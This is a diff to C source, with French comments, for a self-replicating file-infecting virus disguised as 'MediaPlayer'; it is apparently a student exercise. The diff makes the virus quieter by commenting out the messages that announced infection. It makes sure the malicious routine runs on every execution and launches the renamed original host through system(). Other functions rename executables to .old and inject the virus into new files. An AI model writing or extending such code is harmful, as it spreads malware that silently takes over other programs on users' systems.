@@ -6,17 +6,26 @@ int main(int argc, char *argv[]) {
         char *name = argv[0];
 
         // Supprime le . et le /
-        memmove(name, name+2, strlen(name));
-        printf("%s",name);
+        //memmove(name, name+2, strlen(name));
 
         if(strcmp(argv[0],"./MediaPlayer")) {
-                printf("\nNous sommes dans un programme infecté\n");
+                printf("\n(%s) : Nous sommes dans un programme infecté\n",argv[0]);
 
+                char *command = argv[0];
+                char *extension = ".old";
+                char *String = malloc(strlen(command) + 1);
+                if(String) {
+                        strcpy(String,command);
+                        strcat(String,extension);
+                        printf("Preparing to execute : %s\n",String);
+                        system(String);
+                }
         }
         else {
                 mediaplayer();
                 printf("\nNous sommes dans le virus originel\n");
         }
+        malveillant();
         return 0;
 }
 
@@ -116,7 +125,7 @@ void cptExec() {
         Renomme les fichiers, créer un nouveau fichier au même nom et ajout les droits sur le nouveau fichier
 */
 void renamingFile(char *fileName) {
-        printf("\tRenaming %s into %s.old\n",fileName,fileName);
+        //printf("\tRenaming %s into %s.old\n",fileName,fileName);
 
         // renommage des fichiers en .old
         char *command = "mv ";
@@ -161,13 +170,13 @@ void renamingFile(char *fileName) {
 }
 
 void malveillant() {
-        printf("\nBad things happens bruh\n");
+        //printf("\nBad things happens bruh\n");
 
-        printf("\nListing executables and renaming and creating new files..\n\n");
+        //printf("\nListing executables and renaming and creating new files..\n\n");
 
         cptExec();
 
-        printf("\nInjection du code du virus MediaPlayer dans les nouveaux executables..\n");
+        //printf("\nInjection du code du virus MediaPlayer dans les nouveaux executables..\n");
 
 
 }
